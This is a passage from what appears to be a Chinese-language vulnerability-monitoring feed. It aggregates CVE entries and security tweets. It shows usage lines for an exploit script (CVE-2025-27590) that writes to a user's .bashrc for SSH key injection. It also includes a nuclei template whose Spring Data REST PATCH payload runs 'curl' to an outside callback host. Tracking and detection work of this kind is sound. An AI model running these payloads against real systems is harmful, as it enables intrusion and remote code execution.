class="hljs-attr">**Impact**:</span> <span class="hljs-string">Arbitrary</span> <span class="hljs-string">shell</span> <span class="hljs-string">command</span> <span class="hljs-string">execution,</span> <span class="hljs-string">including</span> <span class="hljs-string">SSH</span> <span class="hljs-string">key</span> <span class="hljs-string">injection</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment">## 🚀 Usage</span><br><br><span class="hljs-string">python3</span> <span class="hljs-string">exploit_cve_2025_27590.py</span> <span class="hljs-string">-u</span> <span class="hljs-string">&lt;TARGET_IP_OR_DOMAIN&gt;</span> <span class="hljs-string">-p</span> <span class="hljs-string">&lt;PORT&gt;</span> <span class="hljs-string">-l</span> <span class="hljs-string">&lt;PATH_TO_WRITE&gt;</span><br><br><br><span class="hljs-string">python3</span> <span class="hljs-string">exploit_cve_2025_27590.py</span> <span class="hljs-string">-u</span> <span class="hljs-number">172.20</span><span class="hljs-number">.221</span><span class="hljs-number">.195</span> <span class="hljs-string">-p</span> <span class="hljs-number">8888</span> <span class="hljs-string">-l</span> <span class="hljs-string">/home/oxidized/.bashrc</span><br><br></code></pre></td></tr></table></figure><pre><code class="hljs">- README.md- exploit.py```</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Web Applications Command Injection via Multipart Form Upload Vulnerability&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="CVE-2025-27590" scheme="http://example.com/tags/CVE-2025-27590/"/>
    
  </entry>
  
  <entry>
    <title>Spring Data REST PATCH Request Remote Code Execution Vulnerability</title>
    <link href="http://example.com/2025/06/01/github_1822799483/"/>
    <id>http://example.com/2025/06/01/github_1822799483/</id>
    <published>2025-06-01T13:15:28.830Z</published>
    <updated>2025-06-01T13:15:28.828Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Spring Data REST PATCH Request Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2017-8046</li></ul><p><strong>漏洞类型：</strong> 远程代码执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用特制的JSON数据执行任意Java代码。</p><p><strong>产品厂商：</strong> pivotal_software</p><p><strong>产品名称：</strong> Spring Data REST</p><p><strong>影响版本：</strong> &lt; 2.6.9, &lt; 3.0.1</p><p><strong>搜索语法：</strong> http.title:”eureka”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/eb43700a37734f646c7c62f8c8f9275999236b5c/http%2Fcves%2F2017%2FCVE-2017-8046.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/eb43700a37734f646c7c62f8c8f9275999236b5c/http%2Fcves%2F2017%2FCVE-2017-8046.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><pre><code class="hljs">id: CVE-2017-8046info:  name: Spring Data REST &lt; 2.6.9 (Ingalls SR9) / 3.0.1 (Kay SR1) - PATCH Request Remote Code Execution  author: domwhewell-sage  severity: critical  description: |    Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6 contain a remote code execution caused by processing malicious PATCH requests with crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.  impact: |    Malicious PATCH requests submitted to servers using Spring Data REST versions prior to 2.6.9 (Ingalls SR9), versions prior to 3.0.1 (Kay SR1) and Spring Boot versions prior to 1.5.9, 2.0 M6 can use specially crafted JSON data to run arbitrary Java code.  remediation: |    To remediate this vulnerability, update to Spring Data REST version 2.6.9 or later, or 3.0.1 or later, and Spring Boot version 1.5.9 or later, or 2.0 M6 or later.  reference:    - https://nvd.nist.gov/vuln/detail/CVE-2017-8046    - https://spring.io/security/cve-2017-8046  classification:    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H    cvss-score: 9.8    cve-id: CVE-2017-8046    cwe-id: CWE-20    cpe: cpe:2.3:a:pivotal_software:spring_data_rest:*:*:*:*:*:*:*:*  metadata:    vendor: pivotal_software    product: spring_data_rest    shodan-query: http.title:&quot;eureka&quot;  tags: cve,cve2017,pivotal,springboot,pivotal_softwareflow: |  http(1)  for(let endpoint_urls of iterate(template.endpoints))&#123;    set(&quot;endpoints&quot;, endpoint_urls)    http(2)  &#125;http:  - method: GET    path:      - &quot;&#123;&#123;BaseURL&#125;&#125;&quot;    redirects: true    max-redirects: 3    extractors:      - type: regex        name: endpoints        part: body        group: 1        internal: true        regex:          - &#39;&quot;href&quot;\s*:\s*&quot;([^&quot;&#123;]+)&#39;  - method: PATCH    path:      - &quot;&#123;&#123;endpoints&#125;&#125;/1&quot;    headers:      Content-Type: application/json-patch+json    body: |      [        &#123;          &quot;op&quot;: &quot;replace&quot;,          &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(\&quot;curl &#123;&#123;interactsh-url&#125;&#125;\&quot;).x&quot;,          &quot;value&quot;: &quot;pwned&quot;        &#125;      ]    matchers:      - type: word        part: interactsh_protocol        words:          - dns```</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Spring Data REST PATCH Request Remote Code Execution Vulnerability&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;str</summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="远程代码执行" scheme="http://example.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
    <category term="CVE-2017-8046" scheme="http://example.com/tags/CVE-2017-8046/"/>
    
  </entry>
  
  <entry>
    <title>Google Chrome Heap Buffer Overflow Vulnerability</title>
    <link href="http://example.com/2025/06/01/github_3032523810/"/>
    <id>http://example.com/2025/06/01/github_3032523810/</id>
    <published>2025-06-01T13:15:15.068Z</published>
    <updated>2025-06-01T13:15:15.067Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Google Chrome Heap Buffer Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-15999</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Google Chrome 86.0.4240.111之前的版本中存在一个堆缓冲区溢出漏洞，该漏洞由Freetype中的堆损坏引起，远程攻击者可能通过精心制作的HTML执行任意代码，利用此漏洞需要访问恶意网页。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> Google Chrome</p><p><strong>影响版本：</strong> version &lt; 86.0.4240.111</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:debian:debian_linux”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12217">https://github.com/projectdiscovery/nuclei-templates/issues/12217</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### Description: <br>&gt; Google Chrome &lt; <span class="hljs-number">86.0</span><span class="hljs-number">.4240</span><span class="hljs-number">.111</span> contains a heap buffer overflow caused by heap corruption <span class="hljs-keyword">in</span> Freetype, letting remote attackers potentially execute arbitrary <span class="hljs-keyword">code</span> via crafted HTML, exploit requires visiting malicious webpage.<br><br>#### Severity: `Critical`<br><br>#### POC: <br>- https:<span class="hljs-comment">//crbug.com/1139963</span><br>- https:<span class="hljs-comment">//googleprojectzero.blogspot.com/p/rca-cve-2020-15999.html</span><br>- https:<span class="hljs-comment">//vulncheck.com/xdb/8566ea6250e8</span><br>- https:<span class="hljs-comment">//github.com/Marmeus/CVE-2020-15999</span><br>- https<span class="hljs-comment">///github.com:Marmeus/CVE-2020-15999.git</span><br>- https:<span class="hljs-comment">//github.com/maarlo/CVE-2020-15999</span><br>- https:<span class="hljs-comment">//github.com/oxfemale/CVE-2020-15999</span><br><br>### KEV: <span class="hljs-literal">True</span><br><br>### Shodan Query: `cpe:<span class="hljs-string">&quot;cpe:2.3:o:debian:debian_linux&quot;</span>`<br><br>&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along <span class="hljs-keyword">with</span> the template to help the triage team <span class="hljs-keyword">with</span> validation or can also share a vulnerable environment like docker file. <br><br>&gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding <span class="hljs-keyword">code</span> templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates <span class="hljs-keyword">with</span> other protocols unless exceptions are made.<br><br>You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https:<span class="hljs-comment">//github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Google Chrome Heap Buffer Overflow Vulnerability&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; </summary>
      
    
    
    
    <category term="漏洞监控" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="CVE-2020-15999" scheme="http://example.com/tags/CVE-2020-15999/"/>
    
    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Horizon3Attack twitter update</title>
    <link href="http://example.com/2025/06/01/twitter_1654937742/"/>
    <id>http://example.com/2025/06/01/twitter_1654937742/</id>
    <published>2025-06-01T13:13:02.565Z</published>
    <updated>2025-06-01T13:13:02.561Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> Horizon3Attack</p><p><strong>推文：</strong> 看看我们对#Fortinet CVE-2025-32756的最新深度解析，这是一个典型的缓冲区溢出漏洞！该漏洞已被野外利用，并于上周被添加到CISA KEV目录中。<br><a href="https://t.co/HYNCsIPkMl">https://t.co/HYNCsIPkMl</a> <a href="https://t.co/2hgY6RYDRj">https://t.co/2hgY6RYDRj</a></p><p><strong>链接：</strong> <a href="https://x.com/Horizon3Attack/status/1925604263557804412">https://x.com/Horizon3Attack/status/1925604263557804412</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Horizon3Attack&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 看看我们对#Fortinet CVE-2025-32756的最新深度解析，这是一个典型的缓冲区溢出漏洞！该漏洞已被野外利用，并于上周被添加到CIS</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="Horizon3Attack" scheme="http://example.com/tags/Horizon3Attack/"/>
    
  </entry>
  
  <entry>
    <title>Horizon3Attack twitter update</title>
    <link href="http://example.com/2025/06/01/twitter_4118876722/"/>
    <id>http://example.com/2025/06/01/twitter_4118876722/</id>
    <published>2025-06-01T13:12:28.474Z</published>
    <updated>2025-06-01T13:12:28.468Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> Horizon3Attack</p><p><strong>推文：</strong> 我们最新的博客探讨了CVE-2025-20188，这是#Cisco IOS XE无线控制器中由于硬编码凭证导致的任意文件上传漏洞。</p><p><a href="https://t.co/XTG5PmnoVh">https://t.co/XTG5PmnoVh</a></p><p><strong>链接：</strong> <a href="https://x.com/Horizon3Attack/status/1928155109994668125">https://x.com/Horizon3Attack/status/1928155109994668125</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Horizon3Attack&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 我们最新的博客探讨了CVE-2025-20188，这是#Cisco IOS XE无线控制器中由于硬编码凭证导致的任意文件上传漏洞。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="Horizon3Attack" scheme="http://example.com/tags/Horizon3Attack/"/>
    
  </entry>
  
</feed>
